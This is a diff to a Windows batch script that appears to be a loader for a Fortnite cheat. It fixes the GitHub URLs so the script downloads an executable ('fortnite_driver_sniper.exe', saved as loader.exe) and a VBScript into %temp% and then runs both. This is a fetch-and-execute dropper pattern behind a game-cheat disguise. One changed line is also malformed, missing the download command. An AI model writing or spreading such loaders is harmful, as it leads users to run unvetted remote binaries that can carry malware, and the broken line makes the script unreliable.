@@ -1,5 +1,5 @@
 @echo off
-Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/blob/main/welcome.vbs -OutFile %temp%/welcome.vbs
+Powershell https://raw.githubusercontent.com/fortnite-bot/fncheat/main/welcome.vbs -OutFile %temp%/welcome.vbs
 
 IF EXIST "%temp%/loader.exe" (
     goto :menu
@@ -11,7 +11,7 @@ goto :menu
 
 :start
 Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/blob/main/fortnite_driver_sniper.exe -OutFile %temp%/loader.exe
-Powershell Invoke-WebRequest https://github.com/fortnite-bot/fncheat/blob/main/welcome.vbs -OutFile %temp%/welcome.vbs
+Powershell Invoke-WebRequest https://raw.githubusercontent.com/fortnite-bot/fncheat/main/welcome.vbs -OutFile %temp%/welcome.vbs
 "%temp%/welcome.vbs"
 "%temp%/loader.exe"
 IF EXIST "%temp%/." (
